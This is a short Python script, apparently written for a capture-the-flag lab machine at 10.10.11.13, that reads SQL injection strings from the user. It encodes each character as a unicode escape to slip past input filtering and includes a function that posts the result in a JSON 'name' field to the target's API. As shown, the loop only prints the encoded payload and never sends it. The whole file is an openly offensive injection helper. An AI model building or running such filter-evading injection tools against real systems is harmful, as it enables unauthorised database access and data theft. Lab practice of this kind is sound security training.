from pwn import *
import requests, pdb, signal, sys, time, json

def def_handler(sig, frame):

    print("\n[+] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
main_url = "http://10.10.11.13/api/"
def getUnicode(sqli):
    
    sqli_modified = ""
    for character in sqli:
        sqli_modified += "\\u00" + hex(ord(character))[2::]
    return sqli_modified

def makeRequest(sqli_modified):
    
    headers = {
        'Content-Type':'application/json;charset=utf-8'
    }
    post_data = '{"name":"%s"}' % sqli_modified

    r = requests.post(main_url, headers=headers, data=post_data)


if __name__ == "__main__":
    
    while True:
        sqli = input("> ")
        sqli.strip()
        sql_modified = getUnicode(sqli)

        print(sql_modified)